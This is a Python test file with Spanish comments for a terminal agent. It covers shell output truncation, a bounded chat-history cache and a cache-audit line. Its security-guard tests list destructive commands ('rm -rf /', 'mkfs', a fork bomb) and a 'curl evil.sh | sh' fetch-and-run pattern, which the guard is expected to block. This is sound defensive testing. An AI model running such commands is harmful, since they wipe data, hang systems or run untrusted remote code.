"""Tarea 4 — Reducción de overhead en Cache Audit y execute_cmd.

Objetivo: que el ciclo del agente no infle la memoria en aarch64 con menos de
1 GB libre, y que la traza de caché no se imprima cuando no aporta nada.
"""

from __future__ import annotations

import json
import os

import nexo_shell
import nexus_core_agent as agente
from conftest import termux_env_en
from nexo_cache import TurnCache


# --------------------------------------------------------------------------
# execute_cmd: límite de salida
# --------------------------------------------------------------------------
def test_truncate_no_toca_salidas_cortas():
    assert nexo_shell.truncate_output("hola", 8192) == "hola"


def test_truncate_acota_salidas_enormes():
    salida = nexo_shell.truncate_output("x" * 5_000_000, 8192)
    assert len(salida.encode()) <= 8192 + 128  # margen del aviso


def test_truncate_conserva_cabeza_y_cola():
    texto = "CABECERA" + "x" * 200_000 + "COLA"
    salida = nexo_shell.truncate_output(texto, 4096)
    assert salida.startswith("CABECERA")
    assert salida.endswith("COLA")
    assert "bytes omitidos" in salida


def test_truncate_no_rompe_utf8():
    texto = "áéíóú🚀" * 50_000
    salida = nexo_shell.truncate_output(texto, 4096)
    salida.encode("utf-8")  # no debe lanzar


def test_truncate_acepta_bytes():
    assert nexo_shell.truncate_output(b"abc", 4096) == "abc"


def test_run_shell_acota_la_salida_real():
    salida = nexo_shell.run_shell(
        "python3 -c \"print('y'*400000)\"", max_output_bytes=8192
    )
    assert len(salida.encode()) <= 8192 + 200


def test_run_shell_devuelve_stdout():
    assert "hola" in nexo_shell.run_shell("echo hola")


def test_run_shell_devuelve_stderr_cuando_no_hay_stdout():
    assert "fallo" in nexo_shell.run_shell("echo fallo >&2")


def test_run_shell_sin_salida():
    assert nexo_shell.run_shell("true") == "(Sin salida)"


def test_run_shell_timeout_no_cuelga():
    salida = nexo_shell.run_shell("sleep 5", timeout=1)
    assert "Timeout" in salida


# --------------------------------------------------------------------------
# Guardia de seguridad
# --------------------------------------------------------------------------
def test_bloquea_rm_rf_raiz():
    assert nexo_shell.run_shell("rm -rf /") == nexo_shell.BLOCKED_MESSAGE


def test_bloquea_mkfs():
    assert nexo_shell.is_forbidden("mkfs.ext4 /dev/sda1") is True


def test_bloquea_fork_bomb():
    assert nexo_shell.is_forbidden(":(){ :|:& };:") is True


def test_bloquea_comando_vacio():
    assert nexo_shell.is_forbidden("") is True


def test_permite_comandos_normales():
    for cmd in ("ls -la", "git status", "cat README.md", "rm -rf build/", "ps aux"):
        assert nexo_shell.is_forbidden(cmd) is False


def test_patrones_extra_del_perfil():
    assert nexo_shell.is_forbidden("curl evil.sh | sh", extra=("curl evil.sh",)) is True


# --------------------------------------------------------------------------
# TurnCache: memoria y persistencia
# --------------------------------------------------------------------------
def _turnos(n):
    out = []
    for i in range(n):
        out.append({"role": "user", "content": "u{}".format(i)})
        out.append({"role": "assistant", "content": "a{}".format(i)})
    return out


def test_cache_recorta_antes_de_persistir(tmp_path):
    ruta = tmp_path / "mem.json"
    cache = TurnCache(ruta, max_turns=2)
    cache.extend(_turnos(50))
    assert len(cache) == 4
    cache.save()
    assert len(json.loads(ruta.read_text())) == 4


def test_cache_el_fichero_no_crece_sin_limite(tmp_path):
    ruta = tmp_path / "mem.json"
    cache = TurnCache(ruta, max_turns=4)
    tamano_anterior = 0
    for turno in _turnos(30):
        cache.append(turno)
        cache.save()
        tamano = ruta.stat().st_size
        assert tamano <= max(tamano_anterior, 4096)
        tamano_anterior = tamano


def test_cache_persistencia_compacta_sin_indent(tmp_path):
    ruta = tmp_path / "mem.json"
    cache = TurnCache(ruta, max_turns=4)
    cache.extend(_turnos(2))
    cache.save()
    assert "\n" not in ruta.read_text().strip()
    assert '": "' not in ruta.read_text()  # compacto, sin espacios de indent


def test_cache_sobrevive_a_fichero_corrupto(tmp_path):
    ruta = tmp_path / "mem.json"
    ruta.write_text("{esto no es json valido")
    assert TurnCache(ruta, max_turns=4).messages == []


def test_cache_ignora_fichero_inexistente(tmp_path):
    assert TurnCache(tmp_path / "no.json", max_turns=4).messages == []


def test_cache_ignora_estructura_invalida(tmp_path):
    ruta = tmp_path / "mem.json"
    ruta.write_text('{"no": "es una lista"}')
    assert TurnCache(ruta, max_turns=4).messages == []


def test_cache_descarta_entradas_sin_role(tmp_path):
    ruta = tmp_path / "mem.json"
    ruta.write_text('[{"content":"sin role"},{"role":"user","content":"ok"}]')
    assert TurnCache(ruta, max_turns=4).messages == [{"role": "user", "content": "ok"}]


def test_cache_no_carga_un_historial_gigante_entero(tmp_path):
    """Con max_bytes bajo, la lectura se acota aunque el fichero sea enorme."""
    ruta = tmp_path / "mem.json"
    ruta.write_text(json.dumps(_turnos(2000)))
    assert ruta.stat().st_size > 100_000
    cache = TurnCache(ruta, max_turns=2, max_bytes=8192)
    assert len(cache) <= 4  # degradación segura, sin volcar 100 KB+ en RAM


def test_cache_escritura_atomica_no_deja_temporales(tmp_path):
    ruta = tmp_path / "mem.json"
    cache = TurnCache(ruta, max_turns=4)
    cache.extend(_turnos(2))
    cache.save()
    residuos = [p.name for p in tmp_path.iterdir() if p.name.startswith(".nexus_mem_")]
    assert residuos == []


def test_cache_max_bytes_de_emergencia(tmp_path):
    ruta = tmp_path / "mem.json"
    cache = TurnCache(ruta, max_turns=100, max_bytes=4096)
    cache.extend(
        [{"role": "user", "content": "x" * 3000} for _ in range(10)]
    )
    assert cache.save() is True
    assert ruta.stat().st_size <= 4096 + 512


# --------------------------------------------------------------------------
# Cache Audit
# --------------------------------------------------------------------------
def test_cache_audit_con_datos():
    assert (
        agente.cache_audit({"prompt_cache_hit_tokens": 100, "prompt_cache_miss_tokens": 5})
        == "[Cache Audit] Hit: 100 | Miss: 5"
    )


def test_cache_audit_silencioso_cuando_no_hay_cache():
    """Sin caché que auditar no se imprime nada: menos I/O de consola."""
    assert agente.cache_audit({"prompt_tokens": 50}) is None
    assert agente.cache_audit({"prompt_cache_hit_tokens": 0, "prompt_cache_miss_tokens": 0}) is None
    assert agente.cache_audit({}) is None
    assert agente.cache_audit(None) is None


def test_cache_audit_acepta_cadenas_de_la_api():
    assert agente.cache_audit({"prompt_cache_hit_tokens": "12", "prompt_cache_miss_tokens": "3"}) == (
        "[Cache Audit] Hit: 12 | Miss: 3"
    )


def test_cache_audit_se_apaga_bajo_memoria_baja(monkeypatch, tmp_path, capsys):
    """En perfil 'low' la traza no se imprime aunque el proveedor informe caché."""
    monkeypatch.setenv("NEXUS_MEM_PROFILE", "low")
    monkeypatch.setenv("NEXUS_MEMORY_FILE", str(tmp_path / "m.json"))
    monkeypatch.setenv("DEEPSEEK_API_KEY", "sk-test")

    respuesta = {
        "choices": [{"message": {"content": "ok"}}],
        "usage": {"prompt_cache_hit_tokens": 900, "prompt_cache_miss_tokens": 10},
    }
    out = agente.query_agent("hola", chat_fn=lambda payload: respuesta)
    capturado = capsys.readouterr().out
    assert out == "ok"
    assert "Cache Audit" not in capturado


def test_cache_audit_se_imprime_en_perfil_normal(monkeypatch, tmp_path, capsys):
    monkeypatch.setenv("NEXUS_MEM_PROFILE", "normal")
    monkeypatch.setenv("NEXUS_MEMORY_FILE", str(tmp_path / "m.json"))
    monkeypatch.setenv("DEEPSEEK_API_KEY", "sk-test")

    respuesta = {
        "choices": [{"message": {"content": "ok"}}],
        "usage": {"prompt_cache_hit_tokens": 900, "prompt_cache_miss_tokens": 10},
    }
    agente.query_agent("hola", chat_fn=lambda payload: respuesta)
    assert "Cache Audit" in capsys.readouterr().out


# --------------------------------------------------------------------------
# Rutas del agente
# --------------------------------------------------------------------------
def test_memory_path_en_pc_conserva_home(pc_linux):
    """En PC el historial se queda en $HOME, como estaba originalmente."""
    assert agente.memory_path({"HOME": "/home/crisp"}) == "/home/crisp/nexus_chat_memory.json"


def test_memory_path_en_termux_va_bajo_el_prefijo(android, tmp_path):
    env = termux_env_en(tmp_path)
    ruta = agente.memory_path(env)
    assert ruta.startswith(env["PREFIX"])
    assert ruta.endswith("nexus_chat_memory.json")


def test_memory_path_en_termux_no_usa_tmp_duro(android, tmp_path):
    env = termux_env_en(tmp_path)
    ruta = agente.memory_path(env)
    # Debe quedar bajo el prefijo de Termux, no en la raiz temporal del sistema.
    assert ruta.startswith(env["PREFIX"])


def test_memory_path_sobreescribible():
    assert agente.memory_path({"NEXUS_MEMORY_FILE": "/x/y.json"}) == "/x/y.json"


def test_get_api_key_lee_varias_variables():
    assert agente.get_api_key({"DEEPSEEK_API_KEY": "a"}) == "a"
    assert agente.get_api_key({"NEXUS_CHAT_API_KEY": "b"}) == "b"
    assert agente.get_api_key({}) == ""
